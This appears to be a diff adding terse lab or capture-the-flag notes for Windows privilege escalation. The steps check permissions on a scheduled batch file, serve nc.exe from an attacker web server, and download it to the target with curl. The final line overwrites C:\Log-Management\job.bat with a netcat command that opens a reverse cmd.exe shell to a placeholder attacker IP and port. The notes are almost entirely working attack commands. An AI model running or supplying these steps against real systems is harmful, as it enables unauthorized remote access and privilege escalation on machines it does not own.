@@ -1,0 +1,16 @@
+
+check file permissions:
+icacls job.bat
+
+
+Download Netcat on attacker box:
+git clone https://github.com/interference-security/kali-windows-binaries
+
+start web server:
+python3 -m http.server 8000
+
+Download Netcat on target box:
+curl http://<your_ip>:8000/nc.exe -o c:\users\daniel\nc.exe
+
+replace target file:
+echo C:\Users\daniel\nc.exe -e cmd.exe <your_ip> 1234 > C:\Log-Management\job.bat
